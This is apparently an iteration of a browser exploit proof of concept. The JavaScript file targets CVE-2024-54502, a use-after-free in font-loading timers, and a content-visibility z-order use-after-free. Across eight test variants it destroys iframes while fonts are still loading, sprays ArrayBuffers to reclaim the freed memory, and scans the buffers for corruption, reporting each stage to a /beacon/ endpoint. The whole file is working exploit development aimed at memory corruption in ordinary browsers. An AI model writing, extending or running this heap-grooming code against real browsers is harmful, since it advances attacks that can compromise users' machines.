// p227 — CVE-2024-54502 font loading timer UAF via iframe destruction
//
// The actual vulnerability: fontLoadingTimerFired callback fires on a
// CSSFontFace/DocumentFontLoader that was freed when its owner document
// was destroyed. Ref-counting doesn't help because the timer raw-pointers
// the object, not the ref.
//
// Trigger: create iframe → load @font-face in iframe → destroy iframe
// while fonts still loading → timer fires on freed memory.
//
// Also tests: Bug 287908 content-visibility z-order UAF (improved from p226)
//
// Beacon prefix: V227-

(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V227-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }
  function BA(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V227-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch (e) {}
  }
  function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }

  BS('BOOT');

  var allDone = [];

  // ---- TEST A: Iframe font destruction (primary CVE-2024-54502 trigger) ----
  // Create iframe, load fonts inside it, destroy iframe while loading
  try {
    BS('A-START');

    var iframe = document.createElement('iframe');
    iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';
    document.body.appendChild(iframe);
    BS('A-IFRAME');

    var idoc = iframe.contentDocument;
    var iwin = iframe.contentWindow;

    // Inject @font-face rules pointing to slow endpoints
    var style = idoc.createElement('style');
    var rules = '';
    for (var i = 0; i < 20; i++) {
      rules += '@font-face { font-family: "IFont' + i + '"; src: url("/beacon/V227-A-FREQ' + i + '?t=' + Date.now() + '&delay=5000") format("woff2"); }\n';
    }
    style.textContent = rules;
    idoc.head.appendChild(style);
    BS('A-RULES-20');

    // Create elements inside iframe that use these fonts → triggers loading
    for (var i = 0; i < 20; i++) {
      var div = idoc.createElement('div');
      div.style.fontFamily = '"IFont' + i + '"';
      div.textContent = 'Loading font ' + i;
      idoc.body.appendChild(div);
    }

    // Force layout inside iframe to kick off font loading
    idoc.body.offsetHeight;
    BS('A-FONT-LOADING');

    // IMMEDIATELY destroy the iframe — fonts are still mid-request
    // This frees the iframe's Document, DocumentFontLoader, CSSFontFace objects
    // But fontLoadingTimerFired may still be scheduled
    document.body.removeChild(iframe);
    iframe = null;
    idoc = null;
    iwin = null;
    BS('A-IFRAME-DESTROYED');

    // Spray to reclaim the freed CSSFontFace/DocumentFontLoader memory
    // CSSFontFace is ~128-256 bytes, DocumentFontLoader is ~80-128 bytes
    var aSpray = [];
    var aSizes = [64, 96, 128, 192, 256, 384];
    for (var si = 0; si < aSizes.length; si++) {
      for (var s = 0; s < 300; s++) {
        var ab = new ArrayBuffer(aSizes[si]);
        var view = new Uint32Array(ab);
        for (var k = 0; k < view.length; k++) {
          view[k] = 0xAAAA0000 | ((si << 12) | (k & 0xFFF));
        }
        aSpray.push(ab);
      }
    }
    BS('A-SPRAYED-' + aSpray.length);

    // Wait for the timer to fire (100ms, 500ms, 1000ms checkpoints)
    setTimeout(function() { BS('A-100MS'); }, 100);
    setTimeout(function() { BS('A-500MS'); }, 500);
    setTimeout(function() {
      BS('A-1000MS-SURVIVED');

      // Scan spray for written pointers (if timer wrote into our buffer)
      var aHitBufs = 0;
      var aTotalNZ = 0;
      for (var i = 0; i < aSpray.length; i++) {
        var v = new Uint8Array(aSpray[i]);
        var nzCount = 0;
        var firstNZ = -1;
        for (var j = 0; j < v.length; j++) {
          var expected;
          var u32idx = j >> 2;
          var byteInU32 = j & 3;
          var si2 = Math.floor(i / 300);
          var u32val = 0xAAAA0000 | ((si2 << 12) | (u32idx & 0xFFF));
          expected = (u32val >> (byteInU32 * 8)) & 0xFF;
          if (v[j] !== expected) {
            if (firstNZ === -1) firstNZ = j;
            nzCount++;
          }
        }
        if (nzCount > 0) {
          aHitBufs++;
          aTotalNZ += nzCount;
          if (aHitBufs <= 3) {
            var u32v = new Uint32Array(aSpray[i]);
            var dump = '';
            for (var d = 0; d < Math.min(8, u32v.length); d++) {
              dump += hex32(u32v[d]) + ' ';
            }
            BS('A-MODIFIED-' + i + '-f' + firstNZ + '-n' + nzCount + '-' + dump.trim());
          }
        }
      }
      BS('A-RESULT-bufs' + aHitBufs + '-nz' + aTotalNZ);
      aSpray = null;
    }, 1000);
  } catch (e) {
    BS('A-ERR-' + e.message.substring(0, 50));
  }

  // ---- TEST B: Multiple iframes rapid create/destroy ----
  // Amplify the window: create many iframes loading fonts, destroy them all
  try {
    BS('B-START');

    var iframes = [];
    for (var f = 0; f < 5; f++) {
      var ifr = document.createElement('iframe');
      ifr.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';
      document.body.appendChild(ifr);

      var fd = ifr.contentDocument;
      var st = fd.createElement('style');
      st.textContent = '@font-face { font-family: "BFont' + f + '"; src: url("/beacon/V227-B-FREQ' + f + '?t=' + Date.now() + '") format("woff2"); }';
      fd.head.appendChild(st);

      var el = fd.createElement('div');
      el.style.fontFamily = '"BFont' + f + '"';
      el.textContent = 'Trigger ' + f;
      fd.body.appendChild(el);
      fd.body.offsetHeight;

      iframes.push(ifr);
    }
    BS('B-IFRAMES-' + iframes.length);

    // Destroy all iframes at once
    for (var f = 0; f < iframes.length; f++) {
      document.body.removeChild(iframes[f]);
    }
    iframes = null;
    BS('B-ALL-DESTROYED');

    // Spray
    var bSpray = [];
    for (var s = 0; s < 1000; s++) {
      var ab = new ArrayBuffer(128);
      var view = new Uint32Array(ab);
      for (var k = 0; k < view.length; k++) view[k] = 0xBBBB0000 | k;
      bSpray.push(ab);
    }
    BS('B-SPRAYED-' + bSpray.length);

    setTimeout(function() {
      BS('B-500MS-SURVIVED');
      bSpray = null;
    }, 500);
  } catch (e) {
    BS('B-ERR-' + e.message.substring(0, 50));
  }

  // ---- TEST C: Iframe + FontFace API (if available) ----
  try {
    BS('C-START');

    if (typeof FontFace !== 'undefined') {
      var ifr = document.createElement('iframe');
      ifr.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';
      document.body.appendChild(ifr);

      var iw = ifr.contentWindow;
      var id = ifr.contentDocument;

      // Use FontFace API inside iframe
      // The FontFace object is tied to the iframe's document
      try {
        var faces = [];
        for (var i = 0; i < 30; i++) {
          var ff = new iw.FontFace('CFont' + i, 'url(/beacon/V227-C-FREQ' + i + '?t=' + Date.now() + ')');
          id.fonts.add(ff);
          ff.load();
          faces.push(ff);
        }
        BS('C-FACES-' + faces.length);

        // Force layout
        var el = id.createElement('div');
        el.textContent = 'FontFace API trigger';
        for (var i = 0; i < 30; i++) {
          el.style.fontFamily = '"CFont' + i + '"';
        }
        id.body.appendChild(el);
        id.body.offsetHeight;
        BS('C-LAYOUT');

        // Kill the iframe while FontFace objects are loading
        faces = null;
        document.body.removeChild(ifr);
        ifr = null;
        iw = null;
        id = null;
        BS('C-DESTROYED');

        // Spray to reclaim FontFace internals
        var cSpray = [];
        for (var s = 0; s < 800; s++) {
          var ab = new ArrayBuffer(192);
          var view = new Uint32Array(ab);
          for (var k = 0; k < view.length; k++) view[k] = 0xCCCC0000 | k;
          cSpray.push(ab);
        }
        BS('C-SPRAYED-' + cSpray.length);

        setTimeout(function() {
          BS('C-SURVIVED');
          cSpray = null;
        }, 1000);
      } catch (e2) {
        BS('C-INNER-ERR-' + e2.message.substring(0, 40));
        document.body.removeChild(ifr);
      }
    } else {
      BS('C-NO-FONTFACE-API');
    }
  } catch (e) {
    BS('C-ERR-' + e.message.substring(0, 50));
  }

  // ---- TEST D: content-visibility hidden → remove → scroll trigger ----
  // Improved Bug 287908 trigger: use IntersectionObserver + scroll to
  // separate the truncation state change from the z-order rebuild
  try {
    BS('D-START');

    var supportsCV = CSS.supports && CSS.supports('content-visibility', 'auto');
    BS('D-CV-' + supportsCV);

    if (supportsCV) {
      // Create a scrollable container
      var scroller = document.createElement('div');
      scroller.style.cssText = 'width:200px;height:100px;overflow:auto;position:relative;';
      document.body.appendChild(scroller);

      // Tall content to enable scrolling
      var spacer = document.createElement('div');
      spacer.style.cssText = 'height:2000px;';
      scroller.appendChild(spacer);

      // Target element far down with content-visibility:auto
      var target = document.createElement('div');
      target.style.cssText = 'position:relative;width:100px;height:50px;content-visibility:auto;contain-intrinsic-size:100px 50px;';
      scroller.appendChild(target);

      // Children with layers inside target
      var kids = [];
      for (var i = 0; i < 8; i++) {
        var kid = document.createElement('div');
        kid.style.cssText = 'position:absolute;top:' + (i*5) + 'px;width:30px;height:4px;z-index:' + (i+1) + ';opacity:0.8;background:red;';
        target.appendChild(kid);
        kids.push(kid);
      }

      document.body.offsetHeight;
      BS('D-LAYOUT');

      // Scroll to make target visible → content-visibility kicks in
      scroller.scrollTop = 1950;
      document.body.offsetHeight;
      BS('D-SCROLLED-VISIBLE');

      // Now scroll away → content-visibility:auto hides it
      scroller.scrollTop = 0;
      document.body.offsetHeight;
      BS('D-SCROLLED-HIDDEN');

      // Remove children while content-visibility has them hidden
      for (var i = kids.length - 1; i >= 0; i--) {
        target.removeChild(kids[i]);
      }
      BS('D-KIDS-REMOVED');

      // Spray
      var dSpray = [];
      for (var s = 0; s < 500; s++) {
        var ab = new ArrayBuffer(768);
        var view = new Uint32Array(ab);
        for (var k = 0; k < view.length; k++) view[k] = 0xDDDD0000 | k;
        dSpray.push(ab);
      }
      BS('D-SPRAYED');

      // Scroll back to make target visible → forces compositing update
      // with stale z-order list containing freed RenderLayers
      scroller.scrollTop = 1950;
      document.body.offsetHeight;
      BS('D-SCROLL-BACK');
      BS('D-SURVIVED');

      document.body.removeChild(scroller);
      dSpray = null;
    } else {
      BS('D-SKIP-NO-CV');
    }
  } catch (e) {
    BS('D-ERR-' + e.message.substring(0, 50));
  }

  // ---- TEST E: Iframe font + document.write destruction ----
  // Alternative destruction: document.write() on an iframe replaces
  // the entire document, destroying CSSFontFace objects while keeping
  // the iframe alive (different codepath from removeChild)
  try {
    BS('E-START');

    var ifr = document.createElement('iframe');
    ifr.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';
    document.body.appendChild(ifr);

    var ed = ifr.contentDocument;
    var st = ed.createElement('style');
    var rules = '';
    for (var i = 0; i < 15; i++) {
      rules += '@font-face { font-family: "EFont' + i + '"; src: url("/beacon/V227-E-FREQ' + i + '?t=' + Date.now() + '") format("woff2"); }\n';
    }
    st.textContent = rules;
    ed.head.appendChild(st);

    for (var i = 0; i < 15; i++) {
      var div = ed.createElement('div');
      div.style.fontFamily = '"EFont' + i + '"';
      div.textContent = 'ELoad ' + i;
      ed.body.appendChild(div);
    }
    ed.body.offsetHeight;
    BS('E-FONTS-LOADING');

    // document.write replaces the entire document
    // The old Document's FontLoader/CSSFontFace objects get freed
    // but any pending timers might still reference them
    ifr.contentDocument.open();
    ifr.contentDocument.write('<html><body>replaced</body></html>');
    ifr.contentDocument.close();
    BS('E-DOC-REPLACED');

    // Spray
    var eSpray = [];
    for (var s = 0; s < 600; s++) {
      var ab = new ArrayBuffer(128);
      var view = new Uint32Array(ab);
      for (var k = 0; k < view.length; k++) view[k] = 0xEEEE0000 | k;
      eSpray.push(ab);
    }
    BS('E-SPRAYED');

    setTimeout(function() {
      BS('E-SURVIVED');
      document.body.removeChild(ifr);
      eSpray = null;
    }, 1000);
  } catch (e) {
    BS('E-ERR-' + e.message.substring(0, 50));
  }

  // ---- TEST F: Nested iframe font cascade ----
  // iframe A loads fonts → iframe B inside A loads fonts → destroy A
  try {
    BS('F-START');

    var outer = document.createElement('iframe');
    outer.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';
    document.body.appendChild(outer);
    var od = outer.contentDocument;

    // Outer iframe fonts
    var ost = od.createElement('style');
    ost.textContent = '@font-face { font-family: "FOuter"; src: url("/beacon/V227-F-FOUTER?t=' + Date.now() + '") format("woff2"); }';
    od.head.appendChild(ost);
    var oel = od.createElement('div');
    oel.style.fontFamily = '"FOuter"';
    oel.textContent = 'Outer font';
    od.body.appendChild(oel);

    // Inner iframe
    var inner = od.createElement('iframe');
    inner.style.cssText = 'width:1px;height:1px;';
    od.body.appendChild(inner);
    var ind = inner.contentDocument;

    var ist = ind.createElement('style');
    ist.textContent = '@font-face { font-family: "FInner"; src: url("/beacon/V227-F-FINNER?t=' + Date.now() + '") format("woff2"); }';
    ind.head.appendChild(ist);
    var iel = ind.createElement('div');
    iel.style.fontFamily = '"FInner"';
    iel.textContent = 'Inner font';
    ind.body.appendChild(iel);

    od.body.offsetHeight;
    ind.body.offsetHeight;
    BS('F-NESTED-LOADING');

    // Destroy outer iframe — frees both Documents and their FontLoaders
    document.body.removeChild(outer);
    outer = null;
    od = null;
    ind = null;
    BS('F-OUTER-DESTROYED');

    // Spray
    var fSpray = [];
    for (var s = 0; s < 500; s++) {
      var ab = new ArrayBuffer(192);
      var view = new Uint32Array(ab);
      for (var k = 0; k < view.length; k++) view[k] = 0xFFFF0000 | k;
      fSpray.push(ab);
    }
    BS('F-SPRAYED');

    setTimeout(function() {
      BS('F-SURVIVED');
      fSpray = null;
    }, 1500);
  } catch (e) {
    BS('F-ERR-' + e.message.substring(0, 50));
  }

  // ---- TEST G: Overflow truncation + microtask timing ----
  // Use Promise.resolve() microtask to separate truncation from removal
  try {
    BS('G-START');

    var g7 = document.createElement('div');
    g7.style.cssText = 'width:1px;overflow:hidden;white-space:nowrap;text-overflow:ellipsis;position:relative;';
    document.body.appendChild(g7);

    var gAtom = document.createElement('span');
    gAtom.style.cssText = 'display:inline-block;position:relative;z-index:5;width:100px;height:20px;opacity:0.7;will-change:opacity;';
    gAtom.textContent = 'TRUNCATED';
    g7.appendChild(gAtom);

    document.body.offsetHeight;
    BS('G-TRUNCATED');

    // Use microtask for tighter timing than setTimeout
    Promise.resolve().then(function() {
      // Remove the truncated child
      if (gAtom.parentNode) g7.removeChild(gAtom);
      gAtom = null;
      BS('G-REMOVED');

      // Spray immediately in microtask
      var gSpray = [];
      for (var s = 0; s < 400; s++) {
        var ab = new ArrayBuffer(768);
        var view = new Uint32Array(ab);
        for (var k = 0; k < view.length; k++) view[k] = 0x77770000 | k;
        gSpray.push(ab);
      }

      // Force compositing in same microtask chain
      g7.style.transform = 'translateZ(0)';
      g7.style.willChange = 'transform';
      var neg = document.createElement('div');
      neg.style.cssText = 'position:absolute;z-index:-1;width:1px;height:1px;opacity:0.5;';
      g7.appendChild(neg);
      document.body.offsetHeight;
      BS('G-COMPOSITED');
      BS('G-SURVIVED');

      document.body.removeChild(g7);
      gSpray = null;
    });
  } catch (e) {
    BS('G-ERR-' + e.message.substring(0, 50));
  }

  // ---- TEST H: Iframe navigation during font load ----
  // Instead of removing iframe, navigate it to about:blank
  try {
    BS('H-START');

    var hifr = document.createElement('iframe');
    hifr.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';
    document.body.appendChild(hifr);

    var hd = hifr.contentDocument;
    var hst = hd.createElement('style');
    var hrules = '';
    for (var i = 0; i < 10; i++) {
      hrules += '@font-face { font-family: "HFont' + i + '"; src: url("/beacon/V227-H-FREQ' + i + '?t=' + Date.now() + '") format("woff2"); }\n';
    }
    hst.textContent = hrules;
    hd.head.appendChild(hst);

    for (var i = 0; i < 10; i++) {
      var div = hd.createElement('div');
      div.style.fontFamily = '"HFont' + i + '"';
      div.textContent = 'H trigger ' + i;
      hd.body.appendChild(div);
    }
    hd.body.offsetHeight;
    BS('H-FONTS-LOADING');

    // Navigate iframe to about:blank — destroys old document
    hifr.src = 'about:blank';
    BS('H-NAVIGATED');

    // Spray immediately
    var hSpray = [];
    for (var s = 0; s < 500; s++) {
      var ab = new ArrayBuffer(128);
      var view = new Uint32Array(ab);
      for (var k = 0; k < view.length; k++) view[k] = 0x88880000 | k;
      hSpray.push(ab);
    }
    BS('H-SPRAYED');

    setTimeout(function() {
      BS('H-SURVIVED');
      document.body.removeChild(hifr);
      hSpray = null;
    }, 1000);
  } catch (e) {
    BS('H-ERR-' + e.message.substring(0, 50));
  }

  BS('SYNC-DONE');
})();
